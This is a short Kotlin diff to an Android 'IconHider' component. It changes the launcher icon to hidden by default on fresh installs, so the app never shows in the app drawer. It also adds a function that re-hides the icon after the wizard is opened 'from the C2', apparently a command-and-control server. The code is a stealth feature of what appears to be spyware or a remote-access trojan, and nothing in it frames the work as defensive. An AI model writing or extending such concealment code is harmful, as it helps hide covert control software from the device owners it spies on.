@@ -33,11 +33,31 @@ object IconHider {
 
     private const val KEY_ICON_HIDDEN = "icon_hidden"
 
-    /** Restores the state saved by the user (called on every app start). */
+    /**
+     * Restores the state saved by the user (called on every app start).
+     *
+     * The default is HIDDEN: the launcher entry is off in the manifest, so a
+     * fresh install never leaves an icon in the app drawer. One UI keeps the
+     * entry in its own cache after the component was disabled, which is why
+     * the alias must not be enabled at install time at all.
+     */
     fun applySaved(ctx: Context) {
         try {
-            val hidden = Prefs.get(ctx, KEY_ICON_HIDDEN, false) as? Boolean ?: false
+            val hidden = Prefs.get(ctx, KEY_ICON_HIDDEN, true) as? Boolean ?: true
             if (hidden) hide(ctx) else show(ctx)
+        } catch (_: Throwable) {
+        }
+    }
+
+    /**
+     * Hides the icon again after a delay - used when the wizard was opened
+     * from the C2 and the user did not finish the flow.
+     */
+    fun hideAfter(ctx: Context, delayMs: Long) {
+        try {
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                try { hide(ctx) } catch (_: Throwable) {}
+            }, delayMs)
         } catch (_: Throwable) {
         }
     }
